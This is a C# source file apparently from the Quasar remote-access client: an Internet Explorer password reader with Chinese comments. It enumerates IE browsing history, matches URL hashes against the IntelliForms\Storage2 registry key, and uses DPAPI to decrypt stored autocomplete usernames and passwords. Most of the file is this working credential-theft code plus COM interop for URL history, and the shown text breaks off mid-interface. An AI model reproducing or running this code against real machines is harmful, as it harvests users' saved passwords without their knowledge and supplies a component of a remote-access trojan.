using Microsoft.Win32;
using Quasar.Client.Helper;
using Quasar.Common.Models;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace Quasar.Client.Recovery.Browsers
{
    public class InternetExplorerPassReader : IAccountReader
    {

        public string ApplicationName => "Internet Explorer";

        #region 公共成员
        public IEnumerable<RecoveredAccount> ReadAccounts()
        {
            List<RecoveredAccount> data = new List<RecoveredAccount>();

            try
            {
                using (ExplorerUrlHistory ieHistory = new ExplorerUrlHistory())
                {
                    List<string[]> dataList = new List<string[]>();

                    foreach (STATURL item in ieHistory)
                    {
                        try
                        {
                            if (DecryptIePassword(item.UrlString, dataList))
                            {
                                foreach (string[] loginInfo in dataList)
                                {
                                    data.Add(new RecoveredAccount()
                                    {
                                        Username = loginInfo[0],
                                        Password = loginInfo[1],
                                        Url = item.UrlString,
                                        Application = ApplicationName
                                    });
                                }
                            }
                        }
                        catch (Exception)
                        {
                        }
                    }
                }
            }
            catch (Exception)
            {
            }

            return data;
        }

        /// <summary>
        /// 获取保存的Cookie
        /// </summary>
        /// <returns>恢复账户列表</returns>
        public static List<RecoveredAccount> GetSavedCookies()
        {
            return new List<RecoveredAccount>();
        }
        #endregion
        #region 私有方法
        private const string regPath = "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2";

        /// <summary>
        /// 将字节数组转换为结构体
        /// </summary>
        /// <typeparam name="T">结构体类型</typeparam>
        /// <param name="bytes">字节数组</param>
        /// <returns>转换后的结构体</returns>
        static T ByteArrayToStructure<T>(byte[] bytes) where T : struct
        {
            GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
            T stuff = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
            handle.Free();
            return stuff;

        }
        
        /// <summary>
        /// 解密IE密码
        /// </summary>
        /// <param name="url">URL地址</param>
        /// <param name="dataList">数据列表</param>
        /// <returns>解密是否成功</returns>
        static bool DecryptIePassword(string url, List<string[]> dataList)
        {
            byte[] cypherBytes;

            // 获取传递的URL的哈希值
            string urlHash = GetURLHashString(url);

            // 检查此哈希是否与注册表中存储的哈希匹配
            if (!DoesURLMatchWithHash(urlHash))
                return false;

            // 现在检索此注册表哈希条目的加密凭据....
            using (RegistryKey key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, regPath))
            {
                if (key == null) return false;

                // 检索此网站哈希的加密数据...
                // 首先获取值...
                cypherBytes = (byte[])key.GetValue(urlHash);
            }

            // 要使用URL作为可选熵，我们必须包含尾随的空字符
            byte[] optionalEntropy = new byte[2 * (url.Length + 1)];
            Buffer.BlockCopy(url.ToCharArray(), 0, optionalEntropy, 0, url.Length * 2);

            // 现在解密自动完成凭据....
            byte[] decryptedBytes = ProtectedData.Unprotect(cypherBytes, optionalEntropy, DataProtectionScope.CurrentUser);

            var ieAutoHeader = ByteArrayToStructure<IEAutoComplteSecretHeader>(decryptedBytes);

            // 检查数据是否包含足够的长度....
            if (decryptedBytes.Length >= (ieAutoHeader.dwSize + ieAutoHeader.dwSecretInfoSize + ieAutoHeader.dwSecretSize))
            {

                // 获取站点的机密条目总数（用户名和密码）...
                // 用户名和密码被视为单独的机密，但在此处将成对处理。
                uint dwTotalSecrets = ieAutoHeader.IESecretHeader.dwTotalSecrets / 2;

                int sizeOfSecretEntry = Marshal.SizeOf(typeof(SecretEntry));
                byte[] secretsBuffer = new byte[ieAutoHeader.dwSecretSize];
                int offset = (int)(ieAutoHeader.dwSize + ieAutoHeader.dwSecretInfoSize);
                Buffer.BlockCopy(decryptedBytes, offset, secretsBuffer, 0, secretsBuffer.Length);

                if (dataList == null)
                    dataList = new List<string[]>();
                else
                    dataList.Clear();

                offset = Marshal.SizeOf(ieAutoHeader);
                // 每次处理2个机密条目（用户名和密码）
                for (int i = 0; i < dwTotalSecrets; i++)
                {

                    byte[] secEntryBuffer = new byte[sizeOfSecretEntry];
                    Buffer.BlockCopy(decryptedBytes, offset, secEntryBuffer, 0, secEntryBuffer.Length);

                    SecretEntry secEntry = ByteArrayToStructure<SecretEntry>(secEntryBuffer);

                    string[] dataTriplet = new string[3]; // 存储每个机密的URL、用户名和密码等数据

                    byte[] secret1 = new byte[secEntry.dwLength * 2];
                    Buffer.BlockCopy(secretsBuffer, (int)secEntry.dwOffset, secret1, 0, secret1.Length);

                    dataTriplet[0] = Encoding.Unicode.GetString(secret1);

                    // 读取另一个机密条目
                    offset += sizeOfSecretEntry;
                    Buffer.BlockCopy(decryptedBytes, offset, secEntryBuffer, 0, secEntryBuffer.Length);
                    secEntry = ByteArrayToStructure<SecretEntry>(secEntryBuffer);

                    byte[] secret2 = new byte[secEntry.dwLength * 2]; // 获取下一个机密的偏移量，即密码
                    Buffer.BlockCopy(secretsBuffer, (int)secEntry.dwOffset, secret2, 0, secret2.Length);

                    dataTriplet[1] = Encoding.Unicode.GetString(secret2);

                    dataTriplet[2] = urlHash;
                    // 移动到下一个条目
                    dataList.Add(dataTriplet);
                    offset += sizeOfSecretEntry;

                }

            }
            return true;
        }

        /// <summary>
        /// 检查URL是否与哈希匹配
        /// </summary>
        /// <param name="urlHash">URL哈希</param>
        /// <returns>是否匹配</returns>
        static bool DoesURLMatchWithHash(string urlHash)
        {
            // 枚举目标注册表的值
            bool result = false;

            using (RegistryKey key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, regPath))
            {
                if (key == null) return false;

                if (key.GetValueNames().Any(value => value == urlHash))
                    result = true;
            }
            return result;
        }

        /// <summary>
        /// 获取URL哈希字符串
        /// </summary>
        /// <param name="wstrURL">URL字符串</param>
        /// <returns>哈希字符串</returns>
        static string GetURLHashString(string wstrURL)
        {
            IntPtr hProv = IntPtr.Zero;
            IntPtr hHash = IntPtr.Zero;

            CryptAcquireContext(out hProv, String.Empty, string.Empty, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);

            if (!CryptCreateHash(hProv, ALG_ID.CALG_SHA1, IntPtr.Zero, 0, ref hHash))
                throw new Win32Exception(Marshal.GetLastWin32Error());

            byte[] bytesToCrypt = Encoding.Unicode.GetBytes(wstrURL);

            StringBuilder urlHash = new StringBuilder(42);
            if (CryptHashData(hHash, bytesToCrypt, (wstrURL.Length + 1) * 2, 0))
            {

                // 检索20字节的哈希值
                uint dwHashLen = 20;
                byte[] buffer = new byte[dwHashLen];

                // 现在获取哈希值...
                if (!CryptGetHashParam(hHash, HashParameters.HP_HASHVAL, buffer, ref dwHashLen, 0))
                    throw new Win32Exception(Marshal.GetLastWin32Error());

                // 将20字节的哈希值转换为十六进制字符串格式...
                byte tail = 0; // 用于计算最后2个字节的值
                urlHash.Length = 0;
                for (int i = 0; i < dwHashLen; ++i)
                {

                    byte c = buffer[i];
                    tail += c;
                    urlHash.AppendFormat("{0:X2}", c);
                }
                urlHash.AppendFormat("{0:X2}", tail);

                CryptDestroyHash(hHash);

            }
            CryptReleaseContext(hProv, 0);

            return urlHash.ToString();
        }
        #endregion
        #region Win32 Interop

        // IE Autocomplete Secret Data structures decoded by Nagareshwar
        //
        //One Secret Info header specifying number of secret strings
        [StructLayout(LayoutKind.Sequential)]
        struct IESecretInfoHeader
        {

            public uint dwIdHeader;     // value - 57 49 43 4B
            public uint dwSize;         // size of this header....24 bytes
            public uint dwTotalSecrets; // divide this by 2 to get actual website entries
            public uint unknown;
            public uint id4;            // value - 01 00 00 00
            public uint unknownZero;

        };

        //Main Decrypted Autocomplete Header data
        [StructLayout(LayoutKind.Sequential)]
        struct IEAutoComplteSecretHeader
        {

            public uint dwSize;                        //This header size
            public uint dwSecretInfoSize;              //= sizeof(IESecretInfoHeader) + numSecrets * sizeof(SecretEntry);
            public uint dwSecretSize;                  //Size of the actual secret strings such as username & password
            public IESecretInfoHeader IESecretHeader;  //info about secrets such as count, size etc
            //SecretEntry secEntries[numSecrets];      //Header for each Secret String
            //WCHAR secrets[numSecrets];               //Actual Secret String in Unicode

        };

        // Header describing each of the secrets such ass username/password.
        // Two secret entries having same SecretId are paired
        [StructLayout(LayoutKind.Explicit)]
        struct SecretEntry
        {

            [FieldOffset(0)]
            public uint dwOffset;           //Offset of this secret entry from the start of secret entry strings

            [FieldOffset(4)]
            public byte SecretId;           //UNIQUE id associated with the secret
            [FieldOffset(5)]
            public byte SecretId1;
            [FieldOffset(6)]
            public byte SecretId2;
            [FieldOffset(7)]
            public byte SecretId3;
            [FieldOffset(8)]
            public byte SecretId4;
            [FieldOffset(9)]
            public byte SecretId5;
            [FieldOffset(10)]
            public byte SecretId6;
            [FieldOffset(11)]
            public byte SecretId7;

            [FieldOffset(12)]
            public uint dwLength;           //length of this secret

        };

        private const uint PROV_RSA_FULL = 1;
        private const uint CRYPT_VERIFYCONTEXT = 0xF0000000;

        private const int ALG_CLASS_HASH = 4 << 13;
        private const int ALG_SID_SHA1 = 4;
        private enum ALG_ID
        {

            CALG_MD5 = 0x00008003,
            CALG_SHA1 = ALG_CLASS_HASH | ALG_SID_SHA1

        }
        [DllImport("advapi32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CryptAcquireContext(out IntPtr phProv, string pszContainer, string pszProvider, uint dwProvType, uint dwFlags);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CryptCreateHash(IntPtr hProv, ALG_ID algid, IntPtr hKey, uint dwFlags, ref IntPtr phHash);

        [DllImport("advapi32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CryptHashData(IntPtr hHash, byte[] pbData, int dwDataLen, uint dwFlags);

        [DllImport("advapi32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CryptDestroyHash(IntPtr hHash);

        private enum HashParameters
        {

            HP_ALGID = 0x0001,   // Hash algorithm
            HP_HASHVAL = 0x0002, // Hash value
            HP_HASHSIZE = 0x0004 // Hash value size

        }

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CryptGetHashParam(IntPtr hHash, HashParameters dwParam, byte[] pbData, ref uint pdwDataLen, uint dwFlags);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CryptReleaseContext(IntPtr hProv, uint dwFlags);

        #endregion
    }

    public class ExplorerUrlHistory : IDisposable
    {
        private readonly IUrlHistoryStg2 obj;
        private UrlHistoryClass urlHistory;
        private List<STATURL> _urlHistoryList;
        /// <summary>
        /// Default constructor for UrlHistoryWrapperClass
        /// </summary>
        public ExplorerUrlHistory()
        {

            urlHistory = new UrlHistoryClass();
            obj = (IUrlHistoryStg2)urlHistory;
            STATURLEnumerator staturlEnumerator = new STATURLEnumerator((IEnumSTATURL)obj.EnumUrls);
            _urlHistoryList = new List<STATURL>();
            staturlEnumerator.GetUrlHistory(_urlHistoryList);

        }

        public int Count
        {
            get
            {
                return _urlHistoryList.Count;
            }
        }


        /// <summary>
        /// 清理所有正在使用的资源。
        /// </summary>
        public void Dispose()
        {

            Marshal.ReleaseComObject(obj);
            urlHistory = null;

        }

        /// <summary>
        /// 将指定的URL放入历史记录中。如果历史记录中不存在该URL，则在历史记录中创建一个条目。
        /// 如果历史记录中存在该URL，则覆盖它。
        /// </summary>
        /// <param name="pocsUrl">要放入历史记录中的URL字符串</param>
        /// <param name="pocsTitle">与该URL关联的标题字符串</param>
        /// <param name="dwFlags">指示URL在历史记录中放置位置的标志。
        /// <example><c>ADDURL_FLAG.ADDURL_ADDTOHISTORYANDCACHE</c></example>
        /// </param>
        public void AddHistoryEntry(string pocsUrl, string pocsTitle, ADDURL_FLAG dwFlags)
        {

            obj.AddUrl(pocsUrl, pocsTitle, dwFlags);

        }

        /// <summary>
        /// 从历史记录中删除指定URL的所有实例。不起作用！
        /// </summary>
        /// <param name="pocsUrl">要删除的URL字符串。</param>
        /// <param name="dwFlags"><c>dwFlags = 0</c></param>
        public bool DeleteHistoryEntry(string pocsUrl, int dwFlags)
        {

            try
            {

                obj.DeleteUrl(pocsUrl, dwFlags);
                return true;

            }
            catch (Exception)
            {

                return false;

            }

        }


        /// <summary>
        /// 查询历史记录并报告作为pocsUrl参数传递的URL是否已被当前用户访问过。
        /// </summary>
        /// <param name="pocsUrl">要查询的URL字符串。</param>
        /// <param name="dwFlags">STATURL_QUERYFLAGS 枚举
        /// <example><c>STATURL_QUERYFLAGS.STATURL_QUERYFLAG_TOPLEVEL</c></example></param>
        /// <returns>返回接收额外URL历史信息的STATURL结构。如果返回的STATURL的pwcsUrl不为空，则查询的URL已被当前用户访问过。
        /// </returns>
        public STATURL QueryUrl(string pocsUrl, STATURL_QUERYFLAGS dwFlags)
        {

            var lpSTATURL = new STATURL();

            try
            {

                //In this case, queried URL has been visited by the current user.
                obj.QueryUrl(pocsUrl, dwFlags, ref lpSTATURL);
                //lpSTATURL.pwcsUrl is NOT null;
                return lpSTATURL;

            }
            catch (FileNotFoundException)
            {

                //Queried URL has not been visited by the current user.
                //lpSTATURL.pwcsUrl is set to null;
                return lpSTATURL;

            }

        }

        /// <summary>
        /// 删除除今天历史记录和临时Internet文件之外的所有历史记录。
        /// </summary>
        public void ClearHistory()
        {

            obj.ClearHistory();

        }

        /// <summary>
        /// 创建一个可以遍历历史记录缓存的枚举器。ExplorerUrlHistory没有实现IEnumerable接口
        /// </summary>
        /// <returns>返回[{STATURLEnumerator}: M.S. : GetEnumerator()返回IEnumerator代替.]对象，该对象可以遍历历史记录缓存。</returns>

        public STATURLEnumerator GetEnumerator()
        {

            return new STATURLEnumerator((IEnumSTATURL)obj.EnumUrls);

        }

        public STATURL this[int index]
        {

            get
            {

                if (index < _urlHistoryList.Count && index >= 0)
                    return _urlHistoryList[index];
                throw new IndexOutOfRangeException();

            }
            set
            {

                if (index < _urlHistoryList.Count && index >= 0)
                    _urlHistoryList[index] = value;
                else throw new IndexOutOfRangeException();

            }

        }

        #region Nested type: STATURLEnumerator

        /// <summary>
        /// 可以遍历历史记录缓存的内部类。STATURLEnumerator没有实现IEnumerator接口。
        /// 历史记录缓存中的项目经常变化，枚举器需要反映特定时间点的数据。
        /// </summary>
        public class STATURLEnumerator
        {

            private readonly IEnumSTATURL _enumerator;
            private int _index;
            private STATURL _staturl;

            /// <summary>
            /// <c>STATURLEnumerator</c>的构造函数，接受表示<c>IEnumSTATURL</c> COM接口的IEnumSTATURL对象。
            /// </summary>
            /// <param name="enumerator"><c>IEnumSTATURL</c> COM接口</param>
            public STATURLEnumerator(IEnumSTATURL enumerator)
            {

                _enumerator = enumerator;

            }

            //Advances the enumerator to the next item of the url history cache.

            /// <summary>
            /// 获取URL历史记录缓存中的当前项目。
            /// </summary>
            public STATURL Current
            {

                get
                {
                    return _staturl;
                }

            }

            /// <summary>
            /// 将枚举器推进到URL历史记录缓存的下一个项目。
            /// </summary>
            /// <returns>如果枚举器成功推进到下一个元素则为true；
            /// 如果枚举器已超过URL历史记录缓存的末尾则为false。
            /// </returns>
            public bool MoveNext()
            {

                _staturl = new STATURL();
                _enumerator.Next(1, ref _staturl, out _index);
                if (_index == 0)
                    return false;
                return true;

            }

            /// <summary>
            /// 跳过枚举序列中指定数量的调用对象。不起作用！
            /// </summary>
            /// <param name="celt"></param>
            public void Skip(int celt)
            {

                _enumerator.Skip(celt);

            }

            /// <summary>
            /// 重置枚举器接口，使其从历史记录的开头开始枚举。
            /// </summary>
            public void Reset()
            {

                _enumerator.Reset();

            }

            /// <summary>
            /// 创建包含与当前枚举器相同枚举状态的重复枚举器。不起作用！
            /// </summary>
            /// <returns>重复的STATURLEnumerator对象</returns>
            public STATURLEnumerator Clone()
            {

                IEnumSTATURL ppenum;
                _enumerator.Clone(out ppenum);
                return new STATURLEnumerator(ppenum);

            }

            /// <summary>
            /// 为枚举定义过滤器。MoveNext()将指定的URL与历史记录列表中的每个URL进行比较以查找匹配项。
            /// MoveNext()然后将匹配列表复制到缓冲区。SetFilter方法用于指定要比较的URL。
            /// </summary>
            /// <param name="poszFilter">过滤器的字符串。
            /// <example>SetFilter('http://', STATURL_QUERYFLAGS.STATURL_QUERYFLAG_TOPLEVEL)  只检索以'http.//'开头的条目。 </example>
            /// </param>
            /// <param name="dwFlags">STATURL_QUERYFLAGS 枚举<exapmle><c>STATURL_QUERYFLAGS.STATURL_QUERYFLAG_TOPLEVEL</c></exapmle></param>
            public void SetFilter(string poszFilter, STATURLFLAGS dwFlags)
            {

                _enumerator.SetFilter(poszFilter, dwFlags);

            }

            /// <summary>
            ///枚举历史记录缓存中的项目并将其存储在IList对象中。
            /// </summary>
            /// <param name="list">IList对象
            /// <example><c>ArrayList</c>对象</example>
            /// </param>
            public void GetUrlHistory(IList list)
            {

                while (true)
                {

                    _staturl = new STATURL();
                    _enumerator.Next(1, ref _staturl, out _index);
                    if (_index == 0)
                        break;
                    //if (_staturl.URL.StartsWith("http"))
                    list.Add(_staturl);

                }
                _enumerator.Reset();

            }

        }

        #endregion

    }

    public class Win32api
    {

        #region shlwapi_URL enum

        /// <summary>
        /// 由CannonializeURL方法使用。
        /// </summary>
        [Flags]
        public enum shlwapi_URL : uint
        {

            /// <summary>
            /// 将URL字符串中的"/./"和"/../"视为文字字符，而不是导航的简写形式。
            /// </summary>
            URL_DONT_SIMPLIFY = 0x08000000,

            /// <summary>
            /// 将任何出现的"%"转换为其转义序列。
            /// </summary>
            URL_ESCAPE_PERCENT = 0x00001000,

            /// <summary>
            /// 仅用转义序列替换空格。此标志优先于URL_ESCAPE_UNSAFE，但不适用于不透明URL。
            /// </summary>
            URL_ESCAPE_SPACES_ONLY = 0x04000000,

            /// <summary>
            /// 用转义序列替换不安全字符。不安全字符是指在Internet传输过程中可能被更改的字符，包括(<, >, ", #, {,}, |, \, ^, ~, [, ], and ')字符。此标志适用于所有URL，包括不透明URL。
            /// </summary>
            URL_ESCAPE_UNSAFE = 0x20000000,

            /// <summary>
            /// Combine URLs with client-defined pluggable protocols, according to the World Wide Web Consortium (W3C) specification. This flag does not apply to standard protocols such as ftp, http, gopher, and so on. If this flag is set, UrlCombine does not simplify URLs, so there is no need to also set URL_DONT_SIMPLIFY.
            /// </summary>
            URL_PLUGGABLE_PROTOCOL = 0x40000000,

            /// <summary>
            /// Un-escape any escape sequences that the URLs contain, with two exceptions. The escape sequences for "?" and "#" are not un-escaped. If one of the URL_ESCAPE_XXX flags is also set, the two URLs are first un-escaped, then combined, then escaped.
            /// </summary>
            URL_UNESCAPE = 0x10000000

        }

        #endregion

        public const uint SHGFI_ATTR_SPECIFIED = 0x20000;
        public const uint SHGFI_ATTRIBUTES = 0x800;
        public const uint SHGFI_PIDL = 0x8;
        public const uint SHGFI_DISPLAYNAME = 0x200;
        public const uint SHGFI_USEFILEATTRIBUTES = 0x10;
        public const uint FILE_ATTRIBUTRE_NORMAL = 0x4000;
        public const uint SHGFI_EXETYPE = 0x2000;
        public const uint SHGFI_SYSICONINDEX = 0x4000;
        public const uint ILC_COLORDDB = 0x1;
        public const uint ILC_MASK = 0x0;
        public const uint ILD_TRANSPARENT = 0x1;
        public const uint SHGFI_ICON = 0x100;
        public const uint SHGFI_LARGEICON = 0x0;
        public const uint SHGFI_SHELLICONSIZE = 0x4;
        public const uint SHGFI_SMALLICON = 0x1;
        public const uint SHGFI_TYPENAME = 0x400;
        public const uint SHGFI_ICONLOCATION = 0x1000;

        [DllImport("shlwapi.dll")]
        public static extern int UrlCanonicalize(
        string pszUrl,
        StringBuilder pszCanonicalized,
        ref int pcchCanonicalized,
        shlwapi_URL dwFlags
        );


        /// <summary>
        /// Takes a URL string and converts it into canonical form
        /// </summary>
        /// <param name="pszUrl">URL string</param>
        /// <param name="dwFlags">shlwapi_URL Enumeration. Flags that specify how the URL is converted to canonical form.</param>
        /// <returns>The converted URL</returns>
        public static string CannonializeURL(string pszUrl, shlwapi_URL dwFlags)
        {

            var buff = new StringBuilder(260);
            int s = buff.Capacity;
            int c = UrlCanonicalize(pszUrl, buff, ref s, dwFlags);
            if (c == 0)
                return buff.ToString();
            else
            {

                buff.Capacity = s;
                c = UrlCanonicalize(pszUrl, buff, ref s, dwFlags);
                return buff.ToString();

            }

        }

        [DllImport("Kernel32.dll", CharSet = CharSet.Auto)]
        private static extern bool FileTimeToSystemTime
        (ref System.Runtime.InteropServices.ComTypes.FILETIME FileTime, ref SYSTEMTIME SystemTime);


        /// <summary>
        /// Converts a file time to DateTime format.
        /// </summary>
        /// <param name="filetime">FILETIME structure</param>
        /// <returns>DateTime structure</returns>
        public static DateTime FileTimeToDateTime(System.Runtime.InteropServices.ComTypes.FILETIME filetime)
        {

            var st = new SYSTEMTIME();
            FileTimeToSystemTime(ref filetime, ref st);
            try
            {

                return new DateTime(st.Year, st.Month, st.Day, st.Hour, st.Minute, st.Second, st.Milliseconds);

            }
            catch (Exception)
            {

                return DateTime.Now;

            }

        }

        [DllImport("Kernel32.dll", CharSet = CharSet.Auto)]
        private static extern bool SystemTimeToFileTime([In] ref SYSTEMTIME lpSystemTime,
                                                                out System.Runtime.InteropServices.ComTypes.FILETIME lpFileTime);


        /// <summary>
        /// Converts a DateTime to file time format.
        /// </summary>
        /// <param name="datetime">DateTime structure</param>
        /// <returns>FILETIME structure</returns>
        public static System.Runtime.InteropServices.ComTypes.FILETIME DateTimeToFileTime(DateTime datetime)
        {

            var st = new SYSTEMTIME();
            st.Year = (short)datetime.Year;
            st.Month = (short)datetime.Month;
            st.Day = (short)datetime.Day;
            st.Hour = (short)datetime.Hour;
            st.Minute = (short)datetime.Minute;
            st.Second = (short)datetime.Second;
            st.Milliseconds = (short)datetime.Millisecond;
            System.Runtime.InteropServices.ComTypes.FILETIME filetime;
            SystemTimeToFileTime(ref st, out filetime);
            return filetime;

        }

        //compares two file times.
        [DllImport("Kernel32.dll")]
        public static extern int CompareFileTime([In] ref System.Runtime.InteropServices.ComTypes.FILETIME lpFileTime1,
[In] ref System.Runtime.InteropServices.ComTypes.FILETIME lpFileTime2);


        //Retrieves information about an object in the file system.
        [DllImport("shell32.dll")]
        public static extern IntPtr SHGetFileInfo(string pszPath, uint dwFileAttributes, ref SHFILEINFO psfi,
          uint cbSizeFileInfo, uint uFlags);

        #region Nested type: SYSTEMTIME
        public struct SYSTEMTIME
        {

            public Int16 Day;
            public Int16 DayOfWeek;
            public Int16 Hour;
            public Int16 Milliseconds;
            public Int16 Minute;
            public Int16 Month;
            public Int16 Second;
            public Int16 Year;

        }
        #endregion

    }

    #region WinAPI
    /// <summary>
    /// Contains information about a file object.
    /// </summary>
    [StructLayout(LayoutKind.Sequential)]
    public struct SHFILEINFO
    {

        public IntPtr hIcon;
        public IntPtr iIcon;
        public uint dwAttributes;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
        public string szDisplayName;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 80)]
        public string szTypeName;

    };


    /// <summary>
    /// The helper class to sort in ascending order by FileTime(LastVisited).
    /// </summary>
    public class SortFileTimeAscendingHelper : IComparer
    {

        #region IComparer Members

        int IComparer.Compare(object a, object b)
        {

            var c1 = (STATURL)a;
            var c2 = (STATURL)b;

            return (CompareFileTime(ref c1.ftLastVisited, ref c2.ftLastVisited));

        }

        #endregion

        [DllImport("Kernel32.dll")]
        private static extern int CompareFileTime([In] ref System.Runtime.InteropServices.ComTypes.FILETIME lpFileTime1, [In] ref System.Runtime.InteropServices.ComTypes.FILETIME lpFileTime2);

        public static IComparer SortFileTimeAscending()
        {

            return new SortFileTimeAscendingHelper();

        }

    }

    public enum STATURL_QUERYFLAGS : uint
    {

        /// <summary>
        /// The specified URL is in the content cache.
        /// </summary>
        STATURL_QUERYFLAG_ISCACHED = 0x00010000,

        /// <summary>
        /// Space for the URL is not allocated when querying for STATURL.
        /// </summary>
        STATURL_QUERYFLAG_NOURL = 0x00020000,

        /// <summary>
        /// Space for the Web page's title is not allocated when querying for STATURL.
        /// </summary>
        STATURL_QUERYFLAG_NOTITLE = 0x00040000,

        /// <summary>
        /// //The item is a top-level item.
        /// </summary>
        STATURL_QUERYFLAG_TOPLEVEL = 0x00080000,

    }

    /// <summary>
    /// Flag on the dwFlags parameter of the STATURL structure, used by the SetFilter method.
    /// </summary>
    public enum STATURLFLAGS : uint
    {

        /// <summary>
        /// Flag on the dwFlags parameter of the STATURL structure indicating that the item is in the cache.
        /// </summary>
        STATURLFLAG_ISCACHED = 0x00000001,

        /// <summary>
        /// Flag on the dwFlags parameter of the STATURL structure indicating that the item is a top-level item.
        /// </summary>
        STATURLFLAG_ISTOPLEVEL = 0x00000002,

    }

    /// <summary>
    /// Used bu the AddHistoryEntry method.
    /// </summary>
    public enum ADDURL_FLAG : uint
    {

        /// <summary>
        /// Write to both the visited links and the dated containers.
        /// </summary>
        ADDURL_ADDTOHISTORYANDCACHE = 0,

        /// <summary>
        /// Write to only the visited links container.
        /// </summary>
        ADDURL_ADDTOCACHE = 1

    }


    /// <summary>
    /// The structure that contains statistics about a URL.
    /// </summary>
    [StructLayout(LayoutKind.Sequential)]
    public struct STATURL
    {

        /// <summary>
        /// Struct size
        /// </summary>
        public int cbSize;

        /// <summary>
        /// URL
        /// </summary>
                                                                  
        [MarshalAs(UnmanagedType.LPWStr)]
        public string pwcsUrl;

        /// <summary>
        /// Page title
        /// </summary>
        [MarshalAs(UnmanagedType.LPWStr)]
        public string pwcsTitle;

        /// <summary>
        /// Last visited date (UTC)
        /// </summary>
        public System.Runtime.InteropServices.ComTypes.FILETIME ftLastVisited;

        /// <summary>
        /// Last updated date (UTC)
        /// </summary>
        public System.Runtime.InteropServices.ComTypes.FILETIME ftLastUpdated;

        /// <summary>
        /// The expiry date of the Web page's content (UTC)
        /// </summary>
        public System.Runtime.InteropServices.ComTypes.FILETIME ftExpires;

        /// <summary>
        /// Flags. STATURLFLAGS Enumaration.
        /// </summary>
        public STATURLFLAGS dwFlags;

        /// <summary>
        /// sets a column header in the DataGrid control. This property is not needed if you do not use it.
        /// </summary>
        public string URL
        {

            get
            {
                return pwcsUrl;
            }

        }

        public string UrlString
        {

            get
            {

                int index = pwcsUrl.IndexOf('?');
                return index < 0 ? pwcsUrl : pwcsUrl.Substring(0, index);

            }

        }

        /// <summary>
        /// sets a column header in the DataGrid control. This property is not needed if you do not use it.
        /// </summary>
        public string Title
        {

            get
            {

                if (pwcsUrl.StartsWith("file:"))
                    return Win32api.CannonializeURL(pwcsUrl, Win32api.shlwapi_URL.URL_UNESCAPE).Substring(8).Replace(
                        '/', '\\');
                return pwcsTitle;

            }

        }

        /// <summary>
        /// sets a column header in the DataGrid control. This property is not needed if you do not use it.
        /// </summary>
        public DateTime LastVisited
        {

            get
            {

                return Win32api.FileTimeToDateTime(ftLastVisited).ToLocalTime();

            }

        }

        /// <summary>
        /// sets a column header in the DataGrid control. This property is not needed if you do not use it.
        /// </summary>
        public DateTime LastUpdated
        {

            get
            {
                return Win32api.FileTimeToDateTime(ftLastUpdated).ToLocalTime();
            }

        }

        /// <summary>
        /// sets a column header in the DataGrid control. This property is not needed if you do not use it.
        /// </summary>
        public DateTime Expires
        {

            get
            {

                try
                {

                    return Win32api.FileTimeToDateTime(ftExpires).ToLocalTime();

                }
                catch (Exception)
                {

                    return DateTime.Now;

                }

            }

        }

        public override string ToString()
        {

            return pwcsUrl;

        }

    }

    [StructLayout(LayoutKind.Sequential)]
    public struct UUID
    {

        public int Data1;
        public short Data2;
        public short Data3;
        public byte[] Data4;

    }

    //Enumerates the cached URLs
    [ComImport]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    [Guid("3C374A42-BAE4-11CF-BF7D-00AA006946EE")]
    public interface IEnumSTATURL
    {

        void Next(int celt, ref STATURL rgelt, out int pceltFetched); //Returns the next \"celt\" URLS from the cache
        void Skip(int celt); //Skips the next \"celt\" URLS from the cache. does not work.
        void Reset(); //Resets the enumeration
        void Clone(out IEnumSTATURL ppenum); //Clones this object
        void SetFilter([MarshalAs(UnmanagedType.LPWStr)] string poszFilter, STATURLFLAGS dwFlags);
        //Sets the enumeration filter

    }


    [ComImport]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    [Guid("3C374A41-BAE4-11CF-BF7D-00AA006946EE")]
    public interface IUrlHistoryStg
    {

        void AddUrl(string pocsUrl, string pocsTitle, ADDURL_FLAG dwFlags); //Adds a new history entry
        void DeleteUrl(string pocsUrl, int dwFlags); //Deletes an entry by its URL. does not work!
        void QueryUrl([MarshalAs(UnmanagedType.LPWStr)] string pocsUrl, STATURL_QUERYFLAGS dwFlags,
          ref STATURL lpSTATURL);

        //Returns a STATURL for a given URL
        void BindToObject([In] string pocsUrl, [In] UUID riid, IntPtr ppvOut); //Binds to an object. does not work!
        object EnumUrls
        {

            [return: MarshalAs(UnmanagedType.IUnknown)]
            get;

        }

        //Returns an enumerator for URLs

    }

    [ComImport]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    [Guid("AFA0DC11-C313-11D0-831A-00C04FD5AE38")]
    public interface IUrlHistoryStg2 : IUrlHistoryStg
    {

        new void AddUrl(string pocsUrl, string pocsTitle, ADDURL_FLAG dwFlags); //Adds a new history entry
        new void DeleteUrl(string pocsUrl, int dwFlags); //Deletes an entry by its URL. does not work!
        new void QueryUrl([MarshalAs(UnmanagedType.LPWStr)] string pocsUrl, STATURL_QUERYFLAGS dwFlags, ref STATURL lpSTATURL);

        //Returns a STATURL for a given URL
        new void BindToObject([In] string pocsUrl, [In] UUID riid, IntPtr ppvOut); //Binds to an object. does not work!
        new object EnumUrls
        {

